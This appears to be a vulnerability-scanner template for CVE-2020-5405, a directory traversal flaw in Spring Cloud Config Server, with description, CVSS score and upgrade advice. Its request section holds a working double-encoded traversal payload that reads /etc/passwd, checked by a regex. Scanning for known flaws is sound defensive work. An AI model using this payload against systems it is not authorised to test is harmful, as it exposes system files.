id: CVE-2020-5405
info:
  name: Spring Cloud Directory Traversal
  author:
  - harshbothra_
  tags:
  - cve
  - cve2020
  - lfi
  - springcloud
  description: |-
    SpringCloud ConfigServer路径遍历漏洞
    绿盟科技安全研究员发现spring-cloud-config-server组件中存在路径遍历漏洞（CVE-2020-5405），攻击者利用此漏洞可以实现目录遍历，读取未授权文件的内容。
  reference:
  - https://pivotal.io/security/cve-2020-5405
  severity: medium
  classification:
    cve-id:
    - cve-2020-5405
    cwe-id:
    - cwe-22
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:N/I:H/A:N
    cvss-score: 6.5
  remediation: |-
    #### 官方修复方案：
    官方已经在最新的版本中修复了该漏洞，请受影响的用户尽快升级版本进行防护。开发人员可以通过配置Maven的方式对应用升级并编译发布，配置方法如下：

    使用2.1.x版本的用户请更新至2.1.7版本：
    ```
    org.springframework.cloud spring-cloud-config-server 2.1.7.RELEASE
    ```
    使用2.2.x版本的用户请更新至2.2.2版本：
    ```
    org.springframework.cloud spring-cloud-config-server 2.2.2.RELEASE
    ```
requests:
- matchers:
  - type: status
    status:
    - 200
  - type: regex
    part: body
    regex:
    - 'root:.*:0:0:'
  matchers-condition: and
  path:
  - '{{BaseURL}}/a/b/%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252fetc/passwd'
  method: GET
